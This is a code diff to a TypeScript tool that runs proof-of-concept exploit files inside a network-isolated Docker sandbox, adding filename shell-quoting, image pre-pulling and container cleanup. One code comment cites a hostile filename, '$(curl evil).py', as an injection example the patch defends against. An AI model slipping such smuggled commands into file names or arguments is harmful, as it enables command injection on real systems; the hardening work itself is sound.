@@ -54,6 +54,8 @@ const EXTENSION_MAP: Record<string, string> = {
 
 const OUTPUT_MAX_CHARS = 4000;
 const TIMEOUT_MS = 30_000;
+/** First-use image downloads are slow — pull outside the run timeout. */
+const PULL_TIMEOUT_MS = 300_000;
 const MAX_BUFFER = 8 * 1024 * 1024;
 
 function getProjectRoot(): string {
@@ -72,6 +74,19 @@ function getProjectRoot(): string {
 
 function loadLanguages(): Record<string, PocLanguage> {
   const languages = { ...BUILTIN_LANGUAGES };
+
+  // Project-level overrides: .pi/poc-languages.json at the workspace root.
+  try {
+    const filePath = join(getProjectRoot(), ".pi", "poc-languages.json");
+    if (existsSync(filePath)) {
+      const extra = JSON.parse(readFileSync(filePath, "utf8")) as Record<string, PocLanguage>;
+      for (const [key, lang] of Object.entries(extra)) {
+        if (lang?.image) languages[key] = lang;
+      }
+    }
+  } catch {
+    // Malformed project config is ignored.
+  }
 
   const envOverride = process.env.PI_POC_LANGUAGES?.trim();
   if (envOverride) {
@@ -225,10 +240,17 @@ function sanitizeOutput(output: string): string {
     .slice(0, OUTPUT_MAX_CHARS);
 }
 
-function buildDockerArgs(image: string, command: string, workspaceDir: string): string[] {
+function buildDockerArgs(
+  image: string,
+  command: string,
+  workspaceDir: string,
+  containerName: string,
+): string[] {
   return [
     "run",
     "--rm",
+    "--name",
+    containerName,
     "--network",
     "none",
     "--read-only",
@@ -253,16 +275,26 @@ function buildDockerArgs(image: string, command: string, workspaceDir: string): 
   ];
 }
 
+/** Escape a string for a POSIX single-quoted shell context. */
+function shq(s: string): string {
+  return `'${s.replace(/'/g, "'\\''")}'`;
+}
+
 function renderCommand(template: string, pocPath: string, inSandbox: boolean): string {
   const sourceName = basename(pocPath);
   const className = sourceName.replace(/\.[^.]+$/i, "");
-  const targetPath = inSandbox ? `/workspace/${sourceName}` : pocPath;
-  const binPath = inSandbox ? "/workspace/poc" : join(dirname(pocPath), "poc");
+  // In the sandbox the template runs under `sh -c`, and the PoC basename is
+  // agent-controlled — single-quote every substitution so a hostile filename
+  // (e.g. `$(curl evil).py`) cannot inject shell into the container entrypoint.
+  // Local mode uses no shell (args passed verbatim), so quoting stays off there.
+  const targetPath = inSandbox ? shq(`/workspace/${sourceName}`) : pocPath;
+  const binPath = inSandbox ? shq("/workspace/poc") : join(dirname(pocPath), "poc");
+  const cls = inSandbox ? shq(className) : className;
 
   return template
     .replace(/{{file}}/g, targetPath)
     .replace(/{{bin}}/g, binPath)
-    .replace(/{{class}}/g, className);
+    .replace(/{{class}}/g, cls);
 }
 
 /**
@@ -286,12 +318,50 @@ function spawnExitCode(result: {
   return 1;
 }
 
+/**
+ * Pull the sandbox image (if absent) BEFORE the timed run. Otherwise a
+ * first-use `docker run` spends the whole 30s run timeout downloading the
+ * image and the PoC fails spuriously.
+ */
+function ensureImage(image: string): void {
+  const inspect = spawnSync("docker", ["image", "inspect", image], {
+    encoding: "utf8",
+    timeout: TIMEOUT_MS,
+  });
+  if (!inspect.error && inspect.status === 0) return;
+  const pull = spawnSync("docker", ["pull", image], {
+    encoding: "utf8",
+    timeout: PULL_TIMEOUT_MS,
+    maxBuffer: MAX_BUFFER,
+  });
+  if (pull.error || pull.status !== 0) {
+    const detail = pull.error?.message ?? (pull.stderr ?? "").slice(0, 300);
+    throw new Error(`Failed to pull PoC sandbox image "${image}": ${detail}`);
+  }
+}
+
 function runSandboxed(pocPath: string, language: PocLanguage): PocRun {
   const ranAt = new Date().toISOString();
   const sourceName = basename(pocPath);
   const workspaceDir = mkdtempSync(resolve(tmpdir(), "poc-runner-"));
+  // Named container so a timed-out / killed client can still be cleaned up —
+  // `--rm` alone leaks the container when the CLI dies before the child exits.
+  const containerName = `poc-runner-${process.pid}-${Math.random().toString(36).slice(2, 10)}`;
 
   try {
+    // Fail closed as a non-zero run (not a throw) when docker/images are
+    // unavailable — callers treat infra failure as "PoC did not verify".
+    try {
+      ensureImage(language.image);
+    } catch (e) {
+      return {
+        path: pocPath,
+        exitCode: 127,
+        output: `[sandbox image error] ${(e as Error).message}`,
+        ranAt,
+        sandbox: true,
+      };
+    }
     copyFileSync(pocPath, `${workspaceDir}/${sourceName}`);
 
     let command: string;
@@ -303,11 +373,15 @@ function runSandboxed(pocPath: string, language: PocLanguage): PocRun {
       throw new Error("Language config has no run or buildRun command");
     }
 
-    const result = spawnSync("docker", buildDockerArgs(language.image, command, workspaceDir), {
-      encoding: "utf8",
-      timeout: TIMEOUT_MS,
-      maxBuffer: MAX_BUFFER,
-    });
+    const result = spawnSync(
+      "docker",
+      buildDockerArgs(language.image, command, workspaceDir, containerName),
+      {
+        encoding: "utf8",
+        timeout: TIMEOUT_MS,
+        maxBuffer: MAX_BUFFER,
+      },
+    );
 
     const spawnErr = result.error ? `\n[spawn error] ${result.error.message}` : "";
     const output = sanitizeOutput((result.stdout ?? "") + (result.stderr ?? "") + spawnErr);
@@ -319,6 +393,12 @@ function runSandboxed(pocPath: string, language: PocLanguage): PocRun {
       sandbox: true,
     };
   } finally {
+    // Best-effort: remove any container still running after a timeout/kill.
+    try {
+      spawnSync("docker", ["rm", "-f", containerName], { timeout: 10_000 });
+    } catch {
+      // Ignore.
+    }
     try {
       rmSync(workspaceDir, { recursive: true, force: true });
     } catch {
@@ -373,8 +453,8 @@ function runLocal(pocPath: string, language: PocLanguage): PocRun {
  *
  * Language detection (in order):
  * 1. Shebang line in the PoC file.
- * 2. Project type markers in the workspace root (e.g., package.json, go.mod, Cargo.toml).
- * 3. File extension.
+ * 2. File extension (a .py PoC in a Node repo still runs under python).
+ * 3. Project type markers in the workspace root (e.g., package.json, requirements.txt).
  * 4. PI_POC_DEFAULT_LANGUAGE environment variable.
  *
  * Users can extend or override language definitions via:
